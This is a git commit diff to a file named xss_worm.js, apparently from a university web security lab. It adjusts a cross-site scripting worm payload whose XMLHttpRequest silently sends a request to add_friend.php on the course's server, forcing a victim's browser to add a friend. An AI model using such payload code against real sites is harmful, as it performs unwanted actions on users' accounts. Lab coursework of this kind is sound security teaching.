653f027b895486e4e29a506ef0efd0ef4c6a6fd9
avm7177 <amthy15@gmail.com>
2021-04-02 13:50:12 -0400

    change

--- xss_worm.js
+++ xss_worm.js
@@ -3,6 +3,6 @@
 //      - friends list
 alert('get kek\'d')
 const http = new XMLHttpRequest();
-const url = 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=76';
+const url = 'http://csec380-core.csec.rit.edu:86/add_friend.php?id=76#';
 http.open("GET", url);
 http.send();
